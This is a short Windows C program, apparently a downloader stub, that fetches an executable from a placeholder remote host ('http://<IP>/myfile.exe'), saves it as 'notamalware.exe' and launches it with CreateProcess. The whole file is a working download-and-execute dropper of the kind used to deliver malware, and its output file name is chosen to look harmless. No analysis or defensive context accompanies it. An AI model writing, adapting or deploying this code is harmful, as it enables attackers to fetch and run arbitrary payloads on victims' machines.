// gcc downloadExec.c -o downloadExec -lwininet
#include <stdio.h>
#include <windows.h>
#include <wininet.h>

int main() {
    HINTERNET hInternet, hConnect;
    DWORD bytesRead;

    // Initialize WinINet
    hInternet = InternetOpenA("Download Example", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        fprintf(stderr, "InternetOpen failed\n");
        return 1;
    }

    // Open a connection to the URL
    hConnect = InternetOpenUrlA(hInternet, "http://<IP>/myfile.exe", NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        fprintf(stderr, "InternetOpenUrl failed\n");
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Create a buffer to store the downloaded data
    char buffer[1024];

    // Open a local file for writing
    FILE* outputFile = fopen("notamalware.exe", "wb");
    if (outputFile == NULL) {
        fprintf(stderr, "Failed to open output file for writing\n");
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Read and write data until the end of the file
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        fwrite(buffer, 1, bytesRead, outputFile);
    }

    // Clean up
    fclose(outputFile);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    TCHAR szCmdline[] = TEXT(".\\notamalware.exe"); 

    // Zero the structures
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Create a process for the executable in the current directory
    if (!CreateProcess(
        NULL,           // No module name (use command line)
        szCmdline,      // Command line - executable in the current directory
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi             // Pointer to PROCESS_INFORMATION structure
    )) {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return -1;
    }

    // Wait until child process exits.
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
